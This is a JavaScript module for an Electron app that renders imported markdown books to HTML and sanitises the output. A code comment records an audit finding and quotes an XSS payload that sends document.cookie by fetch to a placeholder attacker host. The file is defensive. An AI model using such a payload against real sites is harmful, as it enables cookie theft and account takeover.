// @ts-check
/**
 * Minimal markdown renderer shared across all renderer modules.
 * Uses marked ESM build for HTML rendering.
 *
 * NOTE: renderer работает через Electron loadFile() БЕЗ bundler'а.
 * Bare specifier "marked" в браузере не резолвится — поэтому используем
 * прямой path до marked.esm.js. Архитектурный TODO: vendor-copy под
 * renderer/vendor/marked/ (как сделано для katex), чтобы убрать
 * хрупкую привязку к node_modules layout. См. roadmap test-gap audit.
 *
 * SECURITY (audit 2026-05-09, HIGH-1): book.md — это файл импортированный
 * извне. marked.parse возвращает HTML, который кладётся в innerHTML reader'а.
 * Без санитизации `<img src=https://attacker onerror=fetch('https://attacker/?'+
 * document.cookie)>` исполнялся бы с привилегиями window.api. Все вызовы
 * renderMarkdown теперь обязательно проходят через sanitizeHtml.
 */
import { marked } from "../node_modules/marked/lib/marked.esm.js";
import { sanitizeHtml } from "./sanitize.js";

/**
 * Render markdown string to safe HTML. Output PROПУСКАЕТСЯ через
 * sanitizeHtml — защита от XSS-инъекций в импортированных книгах.
 * @param {string} md
 * @returns {string}
 */
export function renderMarkdown(md) {
  if (!md) return "";
  const dirty = /** @type {string} */ (marked.parse(md, { async: false }));
  return sanitizeHtml(dirty);
}
